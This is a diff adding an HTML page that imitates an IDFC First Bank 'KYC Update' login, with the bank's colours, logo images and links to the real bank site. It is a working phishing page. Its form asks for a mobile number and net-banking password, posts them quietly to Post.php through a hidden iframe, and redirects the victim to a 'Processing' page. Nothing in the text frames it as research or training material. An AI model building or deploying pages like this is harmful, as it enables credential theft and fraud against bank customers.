@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <meta charSet="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <meta name="theme-color" content="#9C1D26">
+    <title>IDFC First Bank | KYC Update</title>
+<meta name="description" content="login" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="./style.css">
+  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css'><link rel="stylesheet" href="./style.css">
+<style type="text/css">
+#mn
+{ 
+  width:40%;
+  margin-top:10px;
+  margin-bottom:20px;
+  margin-left:10px;
+}
+#ft
+{ 
+  width:104%;
+  margin-top:50px;
+  margin-left:-7px;
+  text-align:bottom;
+}
+#pc
+{ 
+  width:50%;
+}
+input[type="text"] {
+  width: 90%;
+  color:#707070;
+  border: 1.5px solid #D8D8D8;
+  border-radius: 4px;
+  outline: none;
+  padding: 20px;
+  box-sizing: border-box;
+  transition: 0.3s;
+}
+
+.inputWithIcon input[type="text"] {
+  padding-left: 38px;
+}
+
+.inputWithIcon {
+  position: relative;
+}
+
+.inputWithIcon i {
+  position: absolute;
+  left: 0;
+  top: 7.5px;
+  padding: 10px 25px;
+  color: #9C1D26;
+  transition: 0.3s;
+}
+.inputWithIconPass input[type="text"] {
+  padding-left: 38px;
+}
+
+.inputWithIconPass {
+  position: relative;
+}
+
+.inputWithIconPass i {
+  position: absolute;
+  left: 0;
+  top: 7px;
+  padding: 10px 29px;
+  color: #9C1D26;
+  transition: 0.3s;
+}
+
+input::-webkit-input-placeholder {
+    color: transparent;
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus::-webkit-input-placeholder {
+    color: #999;
+    text-transform:none;
+    font-family: 'Open Sans', sans-serif;
+}
+
+/* Firefox < 19 */
+input:-moz-placeholder {
+    color: transparent;
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus:-moz-placeholder {
+    color: #999;
+    font-family: 'Open Sans', sans-serif;
+    text-transform:none;
+}
+
+/* Firefox > 19 */
+input::-moz-placeholder {
+    color: transparent;
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus::-moz-placeholder {
+    color: #999;
+    font-family: 'Open Sans', sans-serif;
+    text-transform:none;
+}
+
+/* Internet Explorer 10 */
+input:-ms-input-placeholder {
+    color: transparent;
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus:-ms-input-placeholder {
+    color: #999;
+    font-family: 'Open Sans', sans-serif;
+    text-transform:none;
+}
+</style>
+</head>
+<body>
+  <!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing.html';}"></iframe>
+        <div class="container">
+        <img alt="" src="IDFC_Logo.jpg" id="mn"/><br>
+        <center><img alt="" src="IDFC_Pic.jpg" id="pc"/></center>
+                    <center><h1 style="
+                    font-family: 'Open Sans', sans-serif;
+                    font-size:14px;
+                    color:#9C1D26;
+                    margin-bottom:25px;
+                    letter-spacing:0.8px;"
+                    >Let's get started PAN Update</h1></center>
+                    <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="form" >
+                        <div class="inputWithIcon">
+                        <div class="input-group">
+                            <center><input class="input-group__input" type="text" name="Mobile_Number" inputmode="numeric" maxlength="10" placeholder="Enter Mobile Number" id="mobile"
+                            pattern="[6-9]\d{9}" title="Please enter valid mobile number !" required />
+                            <label class="input-group__label" for="mobile">Mobile Number</label>
+                            <i class="fa fa-phone fa-lg fa-fw" aria-hidden="true"></i></center>
+                        </div>
+                        </div>
+                        <div class="input-group">
+                        <div class="inputWithIconPass">
+                        <center><input type="text" class="input-group__input" placeholder="Enter Password" name="Password" id="name" minlength="3" maxlength="25" autocomplete="off" required />
+                        <label class="input-group__label" for="Password">Login Password</label>
+                        <i class="fa fa-key" aria-hidden="true"></i></center>
+                        </div>
+                        </div>
+                        
+                        <center><button type="submit">Proceed to login</button></center><br>
+                        <center><p style="font-family: 'Open Sans', sans-serif; font-size:11px; word-spacing: 0.5px; letter-spacing: 0.2px; font-weight:300; color:#9C1D26; text-decoration:none;" class="link text-center">
+                        <a href="https://my.idfcfirstbank.com/activate-net-banking" style="font-family: 'Open Sans', sans-serif; font-size:11px; font-weight:500; color:#9C1D26; text-decoration:none;">New to netbanking? Activate now | </a>
+                        <a href="https://my.idfcfirstbank.com/forgot-username" style="font-family: 'Open Sans', sans-serif; font-size:11px; font-weight:500; color:#9C1D26; text-decoration:none;">Get username</a><br><br>
+                        <a href="https://my.idfcfirstbank.com/manageCreditcard" style="font-family: 'Open Sans', sans-serif; font-size:11px; font-weight:500; color:#9C1D26; text-decoration:none;">Manage your credit card | </a>
+                        <a href="https://my.idfcfirstbank.com/block-and-unblock-net-banking" style="font-family: 'Open Sans', sans-serif; font-size:11px; font-weight:500; color:#9C1D26; text-decoration:none;">Block/Unblock Netbanking</a><br><br>
+                        <a href="https://www.idfcfirstbank.com/support/branches" style="font-family: 'Open Sans', sans-serif; font-size:11px; font-weight:500; color:#9C1D26; text-decoration:none;">ATM/Branch locator</a>
+                        </p></center>
+                        <img alt="" src="IDFC_Footer.jpg" id="ft"/>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+<!-- partial -->
+  
+</body>
+</html>
